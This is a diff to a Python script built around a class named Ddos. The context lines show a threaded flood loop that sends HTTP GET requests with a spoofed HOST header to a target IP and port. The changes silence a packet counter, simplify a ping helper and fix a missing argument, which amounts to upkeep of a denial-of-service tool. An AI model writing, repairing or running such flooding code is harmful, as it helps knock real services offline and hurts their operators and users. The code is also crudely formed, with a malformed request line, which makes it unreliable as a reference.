@@ -100,7 +100,7 @@ class Ddos:
           s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
           s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
           pocket += 1
-          print(f"pocket{pocket}")
+          #print(f"pocket{pocket}")
           time.sleep(s_t)
 
           if porty == "auto":
@@ -115,16 +115,7 @@ class Ddos:
         s.close() 
 
     def pinging(ip):
-      response = subprocess.run(['ping', '-t', ip], capture_output=True)#, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-      r = response.stdout.decode()
-      r = iter(r.split("\n"))
-      next(r)
-      for i in r:
-        try:
-          print(Style.BRIGHT + Fore.RED + "[+]" + i.split()[2] + " " + i.split()[4])
-
-        except:
-          print('')
+      response = subprocess.run(['ping', '-t', ip])
 
     time.sleep(2)
 
@@ -164,7 +155,7 @@ class Ddos:
         thread = threading.Thread(target = attack)
         thread.start()
 
-      pinging()
+      pinging(ip)
       
   if __name__ == "__main__":
     ddos()
